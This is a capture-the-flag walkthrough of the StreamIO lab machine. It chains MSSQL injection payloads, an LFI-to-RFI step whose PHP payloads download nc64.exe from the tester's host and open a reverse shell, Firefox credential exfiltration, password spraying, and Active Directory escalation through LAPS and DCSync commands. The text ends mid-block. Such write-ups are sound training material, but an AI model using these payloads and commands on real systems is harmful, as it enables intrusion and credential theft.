

**Full chain (one line):**

HTTPS vhost `streamio.htb` → manual **MSSQL SQLi** on `watch` search → dump + crack users → log in as a **staff** user → admin panel hidden **`debug` param = LFI** → read source with `php://filter` → hidden `eval(file_get_contents())` = **RFI → RCE** (shell as *yoshihide*) → config creds → **2nd DB** → crack → *nikk37* (WinRM) → **Firefox saved creds** → *JDgodd* → **BloodHound**: WriteOwner → Core Staff group → **ReadLAPSPassword** → read DC LAPS password → **Administrator**.

Everything below is in plain words with the *why / when / why-not* for each step. The reusable **methodology** is at the very end.

---

## Phase 1 — Enumerate (nmap)

It's a **Domain Controller** running a website:

- **AD ports:** 53 (DNS), 88 (Kerberos), 389/3268 (LDAP), 445 (SMB), 5985 (WinRM), 9389 (AD Web Services), 135/593/49xxx (RPC).
- **80/tcp** → `Microsoft IIS 10.0`, title "IIS Windows Server" — the generic placeholder page.
- **443/tcp** → `ssl/http` with a cert: `commonName=streamIO`, `SAN: DNS:streamIO.htb, DNS:watch.streamIO.htb`.

Add both vhosts to hosts (type them EXACTLY — see the hosts lesson):

```bash
echo '10.129.x.x streamio.htb watch.streamio.htb dc.streamio.htb DC' | sudo tee -a /etc/hosts
```

### Why the app is on HTTPS, not port 80

Port 80's title "IIS Windows Server" is a **placeholder** — no real app there. The real site names live in the **443 certificate's Subject Alternative Name** (`streamIO.htb`, `watch.streamIO.htb`). A server only lists hostnames in its HTTPS cert for sites it serves over HTTPS. So when nmap shows 80 + 443, read the `ssl-cert` block — the CN/SAN give you the real hostnames **and** tell you they're HTTPS. Cert SANs are also free extra vhosts for `/etc/hosts`.

### IIS serves by hostname, not IP

`https://10.129.x.x` hits the **default** site → "Not Found". `https://watch.streamio.htb` routes by the **Host header / TLS SNI** to the real site. Many sites share one IP; the **name** you ask for picks which one. Always use the vhost name, never the raw IP — that's why `/etc/hosts` matters.

### The `curl code=000` triage (and the typo that ate an hour)

```bash
curl -sk https://streamio.htb/ -o /dev/null -w "code=%{http_code} size=%{size_download} ip=%{remote_ip}\n"
```

- `code=000` + **blank `ip=`** → the name **didn't resolve** = a DNS/hosts problem, NOT the web server.
- `code=000` + an `ip=` → it resolved but the connection/TLS failed.
- `code=200` + size>0 → it's up; any "no results" is now a wordlist/filter problem.

My `/etc/hosts` had `streamIO.htb0` — a stray `0` copied from nmap's `Domain: streamIO.htb0.` — so `streamio.htb` never resolved while `watch` did. Note: hosts/DNS are **case-insensitive** (`streamIO` == `streamio`); case is never the bug, a stray character is.

---

## Phase 2 — Web recon & fuzzing

- `streamio.htb` = the real app (login, register, contact, about, `/admin/` which is 403).
- `watch.streamio.htb` = mostly a static front, but it has a **search box** (`search.php`, POST param `q`) and a `blocked.php` anti-automation page.

### Fixing ffuf (why it found nothing at first)

Early ffuf returned nothing for three reasons: it was pointed at **HTTP** (the app is HTTPS), it used `-fs` on a **catch-all** page (every path returned the same size, so `-fs` filtered everything), and it had no extensions on a **PHP** app. The fix:

```bash
ffuf -u https://streamio.htb/FUZZ -e .php -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -ac
```

- `-ac` auto-calibrates and filters the catch-all response (better than guessing `-fs`).
- `-e .php` because it's a PHP app — real pages only appear with the extension.

### Directory brute-forcing — recursion, extensions, cookies

**Spider/crawl vs brute-force.** A crawler (`katana`, `hakrawler`, Burp) follows **existing links** → finds *linked* pages of any extension automatically, but not hidden ones. Brute-force **guesses** paths from a wordlist → finds hidden pages. Use both.

**Recursive by default?** feroxbuster = yes · dirb = yes · ffuf = no (add `-recursion -recursion-depth 2`) · gobuster = no.

**Extensions are NOT automatic.** Brute-forcers request wordlist words exactly (`login` → `/login`). To get `/login.php` you append it yourself, and you pick the extension from the stack: IIS+PHP → `php`, ASP.NET → `aspx`, Java → `jsp`, loot files → `txt,bak,config`. Some wordlists bake extensions in (`raft-*-files.txt`) → then no `-x`.

**The real miss here — `admin/master.php`.** A flat `ffuf -u .../FUZZ` only fuzzes the **top level**, so it found `/admin` but never `admin/master.php` (a nested page). feroxbuster found it because it **recurses by default** — it dove into `/admin` and fuzzed `/admin/FUZZ`. Lesson: when you find a directory, fuzz **inside** it (`/admin/FUZZ`) or use recursion / feroxbuster. A root-only scan never reveals nested files.

**Fuzz WITH a session cookie (authenticated fuzzing).** A page behind a login (like `/admin`, 403 when logged out) returns nothing to an anonymous scan. Pass your session cookie so the scanner hits it as the logged-in user → hidden authenticated pages appear.

```bash
feroxbuster -u https://streamio.htb/admin/ -b "PHPSESSID=<SESSION>" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -x php -k -t 50 --depth 2

# ffuf: ffuf -u https://streamio.htb/admin/FUZZ -e .php -H "Cookie: PHPSESSID=<SESSION>" -w <list> -ac
```

Rule: the moment you get any authenticated access, re-fuzz the authenticated areas with your cookie — there's always more surface behind a login than in front of it.

**"I know nothing" order:** flat + no extensions + big list first (find dirs fast, no guessing) → fingerprint the stack (`whatweb <url>`, `curl -skI <url> | grep -i powered`, or a found page's extension) → add `-e .<ext>` → fuzz inside found dirs with a small list / shallow depth. Never turn on recursion AND broad extensions on a 220k list at once, or you drown.

### The 3 layers of fuzzing (most people only do layer 1)

| Layer | Fuzz the… | Example | Finds |
|---|---|---|---|
| 1. Paths | directory/file names | `/FUZZ`, `/admin/FUZZ` | hidden pages/dirs |
| 2. Parameters | the param **name** | `?FUZZ=test` | hidden GET params (`?debug=`, `?include=`) |
| 3. Values | the param **value** | `?id=FUZZ` | injectable values (SQLi, IDOR) |

Layer 2 — **parameter discovery** — is where the real vulns hide. Apps accept params that aren't linked anywhere (an unlinked `?debug=` doing LFI). You can't see them; you brute-force the names:

```bash
ffuf -u 'https://streamio.htb/admin/?FUZZ=test' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -H "Cookie: PHPSESSID=<S>" -ac

# wfuzz:  wfuzz -u 'https://streamio.htb/admin/?FUZZ=' -w burp-parameter-names.txt -H "Cookie: PHPSESSID=<S>" --hh <baseline-len>

# Arjun:  arjun -u https://streamio.htb/admin/ --headers "Cookie: PHPSESSID=<S>"
```

How it works = the differential test: a param the app ignores returns the normal page; a param it uses returns a different length → those are the hits. `-ac` finds the baseline automatically; with wfuzz you measure it first (`curl ... | wc -c`) and pass `--hh <len>`. The baseline number is per-app/session — measure your own, don't copy a walkthrough's.

Workflow on any page: find the page (layer 1) → fuzz its hidden params (layer 2) → test each param for injection (layer 3).

### The "fishy feeling" that pointed at SQLi

Two things felt off and both were signposts: **register filters SQL characters** ("Bad character detected" on `'`) — why guard against `'` unless there's SQL behind it? And **a fresh account logs in but does nothing useful** — the normal path (login, register) is a dead end by design, so the real path is the abnormal one (inject the query, don't use it legitimately). When something feels off, assume the app is hiding something and dig.

---

## Phase 3 — SQL injection (manual, MSSQL) → dump + crack users

The injection point was `watch.streamio.htb/search.php` (param `q`), and **manual beat sqlmap**.

### Why sqlmap failed here

I first threw sqlmap at all candidates with `--level 5 --risk 3 --tamper=between --random-agent`. The login came back "not injectable"/"not dynamic"; the search/email **tripped `blocked.php`** (rate-limit) every few requests; and `--level 5 --risk 3` + no `--dbms` + no `--threads` over a laggy VPN ran 2+ hours for nothing.

Lesson: on a WAF'd / rate-limited target, sqlmap is often the **wrong** tool — it fires hundreds of noisy requests and trips the block. Manual, surgical injection wins. (If you must use sqlmap: `--threads 10`, one target at a time, `--delay` for rate-limits.) WAF-evasion flags for next time: `--random-agent` (random real browser UA, beats a default-`sqlmap`-UA block) and `--tamper=<script>` (rewrites payloads to dodge **signature** filters — `between`, `space2comment`, `charencode`; `sqlmap --list-tampers`). Neither beats a **rate-limit** — that needs `--delay`.

### Manual UNION injection (what worked)

The search runs `... WHERE title LIKE '%<q>%'`. The WAF has a gap: it blocks `OR` and `ORDER BY`, but **allows `UNION SELECT`**. Break out with `cn'`:

1. Column count (ORDER BY was blocked, so brute UNION directly):

```
cn' UNION SELECT 1,2,3,4,5,6-- -
```

→ 6 columns, and columns 2 & 3 render on the page (reflected).

2. Fingerprint the DBMS (always do this before picking syntax):

```
cn' UNION SELECT 1,@@version,3,4,5,6-- -
```

→ Microsoft SQL Server 2019 → **MSSQL** (so MSSQL syntax, not MySQL — this is where my `database()` attempts failed).

3. Current DB → tables → columns:

```bash
cn' UNION SELECT 1,DB_NAME(),3,4,5,6-- -
# Found STREAMIO

cn' UNION SELECT 1,name,3,4,5,6 FROM STREAMIO..sysobjects WHERE xtype='U'-- -      # tables: users, movies…

cn' UNION SELECT 1,name,3,4,5,6 FROM STREAMIO..syscolumns WHERE id=(SELECT id FROM STREAMIO..sysobjects WHERE name='users')-- -   

# cols: id,is_staff,password,username
```

4. Dump — concat into one reflected column with `+` (MSSQL string join; only col 2 rendered cleanly):

```
cn' UNION SELECT 1,username+':'+password,3,4,5,6 FROM STREAMIO..users-- -
```

→ 31 `username:MD5hash` rows.

### MSSQL manual-injection cheat (dialect matters — fingerprint first)

| Need | MySQL (wrong here) | MSSQL (right) |
|---|---|---|
| current db | `database()` | `DB_NAME()` |
| list dbs | `...information_schema.schemata` | `SELECT name FROM master..sysdatabases` |
| list tables | `information_schema.tables` | `SELECT name FROM <db>..sysobjects WHERE xtype='U'` |
| list columns | `information_schema.columns` | `SELECT name FROM <db>..syscolumns WHERE id=(SELECT id FROM <db>..sysobjects WHERE name='<t>')` |
| join strings | `concat(a,':',b)` | `a+':'+b` |
| table ref | `db.table` | `db..table` (double-dot = default `dbo`) |
| dodge a keyword filter on a column | — | bracket it: `[password]` |

Reflected-column trick: when only one column renders cleanly, jam all your data into it with concat (`a+':'+b`).

### Crack the hashes, then find who's privileged

Unsalted MD5 → fast:

```bash
grep -oE '[a-f0-9]{32}' users.txt > hashes.txt ; hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
# quick first pass: crackstation.net
```

→ 13 of 31 cracked (not all weak — normal; you hunt the ones that fall).

`/admin/` needs a **staff** account, so dump the `is_staff` flag:

```
cn' UNION SELECT 1,username+':'+is_staff,3,4,5,6 FROM STREAMIO..users-- -
```

→ `admin` (id 33) and my own test accounts are `is_staff=0`; the named users (id < 33) are `is_staff=1`. So **"admin" is a decoy** — a username called "admin" is not necessarily the admin; the privilege flag is the truth. Any cracked staff user (e.g. `yoshihide : 66boysandgirls..`) logs into `streamio.htb` and opens `/admin/`.

### Knowing when to stop when there's "no obvious output"

"No output" isn't one thing — identify which: blank page, same-as-normal page, an error, or a redirect/block. To know if there's something, use the **differential test**: change ONE thing and look for ANY reproducible difference — content length, a row appearing/vanishing, response time, a redirect, an error. TRUE vs FALSE (`x' AND 1=1-- -` vs `x' AND 1=2-- -`) or a time delay (`x'; WAITFOR DELAY '0:0:5'-- -`) proves a blind injection even with no visible data. Keep looking while there's a differential or it's a structural vuln class / the app is defending it, and you haven't yet tried varied payload shapes (my `'`/`OR` looked dead but `UNION` worked), encodings/WAF-bypass, other params, other endpoints. Stop only when TRUE and FALSE give byte-identical responses with no timing difference across varied payloads and other params — then park with a note and move on.

---

## Phase 4 — Admin panel → LFI → RCE (shell as yoshihide)

Log in as a staff user → `/admin/` opens. Fuzz its hidden parameters (layer 2):

```bash
wfuzz -u https://streamio.htb/admin/?FUZZ= -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -H "Cookie: PHPSESSID=<S>" --hh 1678
```

→ found `user`, `staff`, `movie`, and the key one: **`debug`**.

### debug = Local File Inclusion → read source with php://filter

`?debug=` takes a filename and **includes** it. `?debug=master.php` loads a page that normally only works when included. To read the PHP **source** (not execute it), use the base64 filter wrapper:

```
https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=master.php
```

Decode it: `echo '<b64>' | base64 -d`.

Why `php://filter`: a normal include **runs** PHP (you'd see output, not code). The `convert.base64-encode` filter reads the file as **data** and base64-encodes it, so you get the raw source back instead of executing it. This is the #1 move once you have an LFI on a PHP app — read every source file to understand the app and find the next bug.

### Why master.php (you asked) — you read ALL source, but master stood out

You don't check **only** master.php. With an LFI the move is to read **every** source file you can (`index.php`, `master.php`, and each admin page) with `php://filter`, because you don't yet know which one holds the bug. That said, master.php was the obvious one to read first for three reasons: (1) feroxbuster had already **found** it (a discovered file), (2) the **name "master"** suggests a central/core include, and (3) — your intuition — **visiting/including it directly behaved oddly**: `?debug=master.php` loaded a page that "only really works when included" (standalone it errors / shows half a page because it expects variables from its parent). A file that's clearly **designed to be included** is a file with include-dependent logic worth reading. So it *felt* sus because it acts like a meant-to-be-included component — but the discipline is still: read them all, master just paid off first.

### The bug in master.php → RFI via eval

The bottom of `master.php` had a form with a hidden `include` field and this logic: if the POST `include` value isn't `index.php`, it runs

```php
eval(file_get_contents($_POST['include']))
```

`file_get_contents()` accepts **URLs**, so you get code execution by **Remote File Inclusion**: point `include` at a PHP file on your own web server, `file_get_contents` fetches it, `eval` runs it.

### RFI → reverse shell (exact 0xdf payloads)

Serve payloads from your box: `python3 -m http.server 80` (and have `nc64.exe` in that folder).

write in the post data captured in burp:

```
POST /admin/?debug=master.php
Cookie: PHPSESSID=<staff session>
Content-Type: application/x-www-form-urlencoded

include=http://10.10.14.6/rce.php
```

`rce.php` (confirm execution):

```php
<?php system("dir C:\\"); ?>
```

if it returns nothing, remove php tag and server it as bare `system("dir C:\\");`, as the `master.php` file already has php tags.

create a `shell.php` locally, include php codes there (download nc + connect back):

```php
<?php
system("powershell -c wget 10.10.14.6/nc64.exe -outfile \\programdata\\nc64.exe");
system("\\programdata\\nc64.exe -e powershell 10.10.14.6 443");
?>
```

Trigger via the RFI — POST to the LFI endpoint with `include` pointing at your file:

```
POST /admin/?debug=master.php
Cookie: PHPSESSID=<staff session>
Content-Type: application/x-www-form-urlencoded

include=http://10.10.14.6/shell.php
```

Listen: `rlwrap -cAr nc -lnvp 443` → shell as **`streamio\yoshihide`**.

### Writable dirs & a fileless option

To drop `nc64.exe` you need a **writable** directory — but don't hunt for one, use the known world-writable defaults: **`C:\ProgramData`** (the go-to), `C:\Windows\Temp`, `C:\Users\Public`, `%TEMP%`. The "upload" happens **through your RCE** (`powershell wget … -outfile`), not a separate step. Confirm writability if unsure: `system("echo test > C:\\programdata\\test.txt & dir C:\\programdata\\test.txt");` or `system("icacls C:\\programdata");`.

**Cleaner alternative — no file, no writable dir needed:** since you already have RCE, run a **fileless PowerShell reverse shell** right in the payload:

```php
system("powershell -e <base64-PS-reverse-shell>");
```

Generate the base64 at revshells.com → "PowerShell #3 (Base64)". Nothing dropped to disk, nothing to upload — best when you're not sure what's writable or want to stay quiet.

### RFI gotchas that will bite you (all cost me hours here)

1. **`eval()` wants NO `<?php ?>` tags** — the fetched file must be **bare** PHP (`system("...");`). Tags = parse error = silent nothing.
2. **The POST needs `Content-Type: application/x-www-form-urlencoded`** — without it PHP leaves `$_POST` empty, so `$_POST['include']` is unset and the eval never fires (no fetch, no error).
3. **Content-Length must be exact** — `echo -n '<body>' | wc -c`. If Burp's number ≠ your count, there are **hidden trailing bytes** → the box requests `r.php___` → 404. Delete them.
4. **Use firewall-friendly ports** — Windows blocks most outbound; serve on **80**, shell back on **443** (not 7777). Bind your server to tun0: `sudo python3 -m http.server 80 --bind <tun0-ip>`.
5. **Double backslashes in PHP strings** — `"\\programdata\\nc64.exe"`, because `\n`/`\p` would be interpreted.
6. **Confirm the callback** — watch your http.server for `GET /r.php 200`. GET+200 = reached & served; GET+404 = trailing-byte junk; no GET = Content-Type/param issue.

---

## Phase 5 — yoshihide → nikk37 (config creds → 2nd database)

On the box, search the web source for stored DB credentials:

```powershell
Select-String -Path C:\inetpub\*\*.php -Pattern "database" -Recurse
```

The source configs reveal **two DB accounts** (the search only reference the `STREAMIO` database — `streamio_backup` is NOT named anywhere in the config):

```
db_admin : B1@hx31234567890     (index.php / register.php)   ← privileged account
db_user  : B1@hB1@hB1@h         (login.php / search.php)
```

 `db_admin` is a privileged SQL login, and a privileged login usually reaches **more databases than the app uses** — so you connect as `db_admin` and **enumerate ALL databases**, which is where the backup DB appears:

```cmd
sqlcmd -S localhost -U db_admin -P 'B1@hx31234567890' -Q "SELECT name FROM sys.databases"

# → master, STREAMIO, streamio_backup  ← the new one

sqlcmd -S localhost -U db_admin -P 'B1@hx31234567890' -d streamio_backup -Q "SELECT table_name FROM information_schema.tables"

sqlcmd -S localhost -U db_admin -P 'B1@hx31234567890' -d streamio_backup -Q "SELECT * FROM users"
```

→ a `users` table with new MD5 hashes. Crack:

```bash
hashcat -m 0 backup_hashes.txt /usr/share/wordlists/rockyou.txt
```

→ **`nikk37 : get_dem_girls2@yahoo.com`**. `nikk37` is in **Remote Management Users**, so log in over WinRM:

```bash
evil-winrm -i 10.129.x.x -u nikk37 -p 'get_dem_girls2@yahoo.com'
```

**Lesson: config = credentials, not a database list.** The web SQLi only ever saw `STREAMIO` because the web code only connects to `STREAMIO`. But the account's creds reach everything that account can see — so once you have DB creds, **enumerate ALL databases (`SELECT name FROM sys.databases`)**, not just the app's. The backup DB (with nikk37) was invisible to the web layer but reachable by `db_admin`.

### Enumerate installed programs → Firefox (the tell that sets up Phase 6)

Once on as nikk37, look at what's actually installed — `C:\Program Files` and especially **`C:\Program Files (x86)`**. One stood out as **unusual for an HTB box: Mozilla Firefox**. A real browser installed on a server is almost never there for show — it means a user browsed and very likely **saved passwords**. That single observation is what points the whole next phase at Firefox's credential store.

```powershell
Get-ChildItem 'C:\Program Files','C:\Program Files (x86)' -ErrorAction SilentlyContinue | Select-Object Name
```

---

## Phase 6 — nikk37 → JDgodd (Firefox saved passwords)

`nikk37` has a Firefox profile with saved passwords. Two ways to get them:

### ⭐ Easy way — LaZagne (one command, on the box)

Upload LaZagne and run it **as nikk37** (browser creds are tied to the user's profile + DPAPI, so it must run as the owning user — which you are, via WinRM):

```powershell
upload lazagne.exe              # evil-winrm built-in
.\lazagne.exe browsers          # just browsers  (or:  .\lazagne.exe all  = browsers + Cred Manager + wifi + …)
```

It prints the logins in **cleartext** — no file copying, no decryptor. (`github.com/AlessandroZ/LaZagne` → releases. AV *can* flag it; if eaten, use the manual route below.)

**⚠️ On StreamIO, LaZagne returned `0 passwords` — so I had to do the manual route.** This is the key lesson: **LaZagne is convenient but NOT reliable** — it misses creds when the browser version/NSS format is newer than its parser, when the profile path is non-standard, or when the WinRM session context can't fully touch the profile. So **when LaZagne comes up empty, don't conclude "no browser creds" — always check manually.** The manual firepwd route works *because* it doesn't depend on LaZagne or the session at all: Firefox stores its key in `key4.db` under its own NSS crypto (no Windows DPAPI, no master password by default), so **firepwd decrypts purely from `key4.db`+`logins.json`, offline.** Grab the two files, decrypt on your box — it just works. (Same idea everywhere: a convenience tool returning nothing ≠ nothing's there; verify by hand.)

**Which browser do I check? The one that's actually installed.** Here a **Mozilla** folder showed up → **Firefox** is the browser in use → so I target Firefox's store (`key4.db`+`logins.json` → firepwd). Don't blindly go for Chrome if it's not there. How to tell which browsers exist, and where each hides its passwords:

| Browser     | Tell-tale folder                           | Password store            | Decrypt with                      |
| ----------- | ------------------------------------------ | ------------------------- | --------------------------------- |
| **Firefox** | `%APPDATA%\Mozilla\Firefox\Profiles\`      | `key4.db` + `logins.json` | **firepwd** (offline, NSS)        |
| **Chrome**  | `%LOCALAPPDATA%\Google\Chrome\User Data\`  | `Login Data` (SQLite)     | **DPAPI** (the user's master key) |
| **Edge**    | `%LOCALAPPDATA%\Microsoft\Edge\User Data\` | `Login Data` (SQLite)     | **DPAPI**                         |
Quick check: 

```
Get-ChildItem $env:APPDATA\Mozilla,$env:LOCALAPPDATA\Google,$env:LOCALAPPDATA\Microsoft\Edge -ErrorAction SilentlyContinue
```

(LaZagne checks them all for you — *when it works*; manually, you target whichever one is present.)

### Manual fallback — firepwd (no tool on the box needed, dodges AV)

Saved passwords live in **`key4.db`** (the key) + **`logins.json`** (the encrypted logins). Exfil both, decrypt offline.

**Easiest — pull them straight through evil-winrm** (no SMB server to stand up). `ls` the Profiles dir first to get the random `*.default-release` profile name, then use evil-winrm's built-in `download` (wildcards don't expand, so pass the real path):

```powershell
Get-ChildItem C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\

download C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\<profile>\key4.db

download C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\<profile>\logins.json
```

**Or via an SMB share** (handy if `download` chokes):

```bash
# attacker
impacket-smbserver share . -user oxdf -pass oxdf -smb2support
```
```cmd
# on the box (WinRM)
net use \\10.10.14.6\share /u:oxdf oxdf
copy C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\*\key4.db    \\10.10.14.6\share\

copy C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\*\logins.json \\10.10.14.6\share\
```
```bash
python3 /opt/firepwd/firepwd.py        # run from the folder holding key4.db + logins.json, no args
```

→ firepwd prints the decrypted Firefox logins — **four, all saved for `https://slack.streamio.htb`**:

```
https://slack.streamio.htb:b'admin',b'JDg0dd1s@d0p3cr3@t0r'
https://slack.streamio.htb:b'nikk37',b'n1kk1sd0p3t00:)'
https://slack.streamio.htb:b'yoshihide',b'paddpadd@12'
https://slack.streamio.htb:b'JDgodd',b'password@12'
```

The URL is a vhost → add `slack.streamio.htb` to `/etc/hosts` and browse it. Here it's just the default **IIS page** (dead end) — the loot is the **four cred pairs**, not the site.

### ⭐ Don't trust the label — SPRAY the passwords (do this on every box)

The entry *labelled* `admin` carries `JDg0dd1s@d0p3cr3@t0r`, and there's a *separate* entry labelled `JDgodd` with `password@12`. So which account does `JDg0dd1s@d0p3cr3@t0r` actually unlock? **Two tells say JDgodd, not "admin":** (1) the password literally spells **JDg0dd** — passwords very often embed their owner's name; (2) a saved-login "username" is just **a label the user typed**, not proof of the account it authenticates as (mislabeled/stale saved logins are the norm). So never *assume* from the label — **spray every password against every username you've collected** and let auth decide:

```bash
nxc smb dc.streamio.htb -u users.txt -p pass.txt --continue-on-success
```

→ `[+] streamio.htb\JDgodd:JDg0dd1s@d0p3cr3@t0r` (the password used for everything in Phase 7).

**Should I think this way on every box? Yes — it's a rule, not a one-off.** Any creds you loot (browser, config, DB, Credential Manager, a note in a share) are **candidate secrets, not labeled assignments**. Password reuse across accounts and wrong/old labels are everywhere. Dump every username you've seen into `users.txt`, every secret into `pass.txt`, and spray with `--continue-on-success` — the `[+]`/`(Pwn3d!)` marks tell you *who* and *where*, so you **prove** ownership instead of guessing it.

### 🧠 Why the browser check HERE — and why it's now a reflex on every box

**Simple rule: the moment you land as a REAL USER, check their saved browser passwords. Run `lazagne.exe all`. Every time.**

Why nikk37 and not yoshihide (or the earlier boxes):

- **nikk37 = a real person.** They log in, open Firefox, and **save passwords** in it → there's loot to steal. They have a real profile (`C:\Users\nikk37\...\Firefox\...`).
- **yoshihide = a web *service* account.** Service accounts never open a browser, so there's **nothing saved** — no browser profile, no loot. (That's why you don't browser-check a web RCE shell.)
- **VulnCicada / Tombwatcher:** you never had a **shell as a user on the box** — you worked **remotely with a domain credential**, so there was no user's browser session to raid. No box-sit = no browser loot.

**Why it's gold:** people **save and REUSE** passwords in their browser, and a saved login usually belongs to a **more privileged account** than the one you're on. Here it handed you **JDgodd** (your path to the domain) — a straight lateral/vertical jump, for free.

**The trigger to memorize:** *interactive shell as a real human user (WinRM/RDP, a `C:\Users\<name>` profile)* → **`lazagne.exe all`** (browsers + Credential Manager + wifi + more). Not for service accounts (no profile), not for remote-cred-only AD work (no box to sit on).

*(How it decrypts: LaZagne/firepwd read Firefox `key4.db`+`logins.json`, or Chrome `Login Data`+DPAPI — but with LaZagne you don't care, it just prints them.)*

### 🔁 The user-shell reflex: **LAZ → NXC → BLOOD**

Whenever you land an interactive shell as a real user, run this loop every time:

1. **LAZ** — `lazagne.exe all` → grab stored creds (browsers, Credential Manager, wifi). Also the cred-grep one-liner + `whoami /priv`.
2. **NXC** — spray the new creds across the domain → find **where they're valid and what they can touch** (`nxc smb/winrm <dc> -u users -p passes --continue-on-success`). A `(Pwn3d!)` = a shell somewhere new.
3. **BLOOD** — with a valid domain cred, `bloodhound-python -c All` → **map the AD path to Administrator** (WriteOwner/GenericAll chains, ReadLAPSPassword, Kerberoast…).

Each step feeds the next: LaZagne gives creds → nxc tells you where they work → BloodHound shows how to turn "a valid user" into "Domain Admin." That's the whole back half of almost every Windows box.

---

## Phase 7 — JDgodd → Administrator (BloodHound: Own/WriteOwner → group → LAPS)

### Why BloodHound now — JDgodd is valid but can't shell in

The spray in Phase 6 returned **`JDgodd : JDg0dd1s@d0p3cr3@t0r` with a `[+]`** on SMB — valid domain creds — but **no `(Pwn3d!)`**, and nxc confirmed **no WinRM, no admin** anywhere:

```bash
nxc smb   dc.streamio.htb -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r'     # [+] valid, no (Pwn3d!)

nxc winrm dc.streamio.htb -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r'     # no WinRM
```

A valid cred that can't log in anywhere = its value is in **what it can DO in AD**, not where it can shell. That's exactly the BloodHound question. Collect as JDgodd:

```bash
bloodhound-python -c All -u jdgodd -p 'JDg0dd1s@d0p3cr3@t0r' -d streamio.htb -ns 10.129.x.x -dc dc.streamio.htb --zip
```

### The graph — more than one road to DA

BloodHound showed JDgodd **Owns + WriteOwner on "Core Staff"**, and from Core Staff two different paths to the DC:
- **Path A — LAPS:** `Core Staff` has **ReadLAPSPassword** on the DC → read the DC's local-admin password.
- **Path B — DCSync:** `Core Staff` ∈ `Users` ∈ `streamio`, and `streamio` has **DCSync** on the domain → dump the Administrator (and krbtgt) hash.
- (Also seen: `nikk37` can **PSRemote to the DC** — but nikk37 isn't admin there, so on its own it's not a win.)

Both A and B start with the same move — **add JDgodd to Core Staff** — then diverge.

### Which path, and why not "because the walkthrough did"

The rule is **pick the shortest path whose every edge you can actually abuse, preferring reads over writes and reversible over destructive** — not copy the writeup. Scored that way, **LAPS wins here**:
- **Fewest steps:** join the group → read **one attribute** → `evil-winrm`. DCSync relies on a 3-deep nested-group chain conferring the replication right transitively, so more has to be true (and verified) before it fires.
- **Cleaner / quieter:** reading `ms-Mcs-AdmPwd` is a single LDAP read; DCSync triggers AD **replication** (noisier, more likely monitored/reset in labs).
- **Intended design:** the box deliberately wires ReadLAPSPassword to Core Staff — that's the point of the machine, which is *why* walkthroughs land there.

Path B is still perfectly valid — and arguably more powerful, since DCSync hands you **every** hash for pass-the-hash / golden tickets. Once you're in Core Staff:

```bash
impacket-secretsdump streamio.htb/JDgodd:'JDg0dd1s@d0p3cr3@t0r'@dc.streamio.htb -just-dc-user Administrator

evil-winrm -i dc.streamio.htb -u Administrator -H <nthash>
```

So: don't choose by walkthrough — choose LAPS because it's one add + one read. DCSync would be the call if LAPS weren't wired up.

### What LAPS is (plain words)

LAPS (Local Administrator Password Solution) randomizes the **local Administrator password** on each machine and stores it in AD, in the computer object's `ms-Mcs-AdmPwd` attribute. Only authorized users/groups can read it. If you can read that attribute, you get the machine's local admin password in cleartext.

### Abuse the chain — bloodyAD from your own box (no borrowed shell)

JDgodd can't WinRM, but the SMB spray proved its password is **valid for the domain** — so it can **LDAP-bind**, which is all bloodyAD needs. Each call is a **fresh bind as JDgodd**, so the new group membership is in force on the very next command — no re-login dance. WriteOwner → own the group → grant yourself write access → add yourself as a member:

```bash
bloodyAD --host dc.streamio.htb -d streamio.htb -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r' set owner 'Core Staff' JDgodd

bloodyAD --host dc.streamio.htb -d streamio.htb -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r' add genericAll 'Core Staff' JDgodd

bloodyAD --host dc.streamio.htb -d streamio.htb -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r' add groupMember 'Core Staff' JDgodd
```

Now JDgodd (via Core Staff) can read the DC's LAPS password:

```bash
bloodyAD --host dc.streamio.htb -d streamio.htb -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r' get object 'DC$' --attr ms-Mcs-AdmPwd
```

Alternatives for the read: `nxc ldap dc.streamio.htb -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r' --laps`, or an `ldapsearch` filtering `(ms-MCS-AdmPwd=*)`.

### ⚠️ Which account does the LAPS password belong to? (don't assume "Administrator")

Legacy LAPS (`ms-Mcs-AdmPwd`) stores the local administrator's password in Active Directory, but it does not tell you the account's name. The password usually belongs to the built-in local Administrator account, but that account might have been renamed or LAPS might be configured to manage a different account. The first command, `nxc smb ... --rid-brute`, enumerates accounts on the domain controller and helps identify the account with RID 500, which is always assigned to the built-in Administrator account, even if its name has changed. The second command checks the newer Windows LAPS attribute, `msLAPS-Password`, whose JSON value can include the account name under the field `"n"`. In short, these commands help you identify which account a LAPS password belongs to instead of simply assuming its name is `Administrator`.


```bash
# Legacy LAPS (our case): resolve the RID-500 account name — look for the entry ending in -500
nxc smb dc.streamio.htb -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r' --rid-brute

# Windows LAPS (newer attribute): the name is embedded in the JSON value, under "n"
bloodyAD --host dc.streamio.htb -d streamio.htb -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r' get object 'DC$' --attr msLAPS-Password
```

(Cheapest check of all: just try `administrator` — if it's renamed, auth fails and you fall back to `--rid-brute`.)

Then log in as the local Administrator with that LAPS password:

```bash
evil-winrm -i dc.streamio.htb -u administrator -p '<LAPS-password>'
```

**Gotcha — LAPS passwords often start with `-`** (ours was `-E6vd4.xw++-yA`), which evil-winrm's option parser mistakes for a flag. If `-p '<pw>'` errors, glue it with `=`:

```bash
evil-winrm -i dc.streamio.htb -u administrator -p='-E6vd4.xw++-yA'
```

→ **Administrator.** The root flag was on Martin's desktop (Martin is also in the Administrators group). You don't switch to Martin — as the local Administrator you already own the whole filesystem, so you just read his desktop directly:

```bash
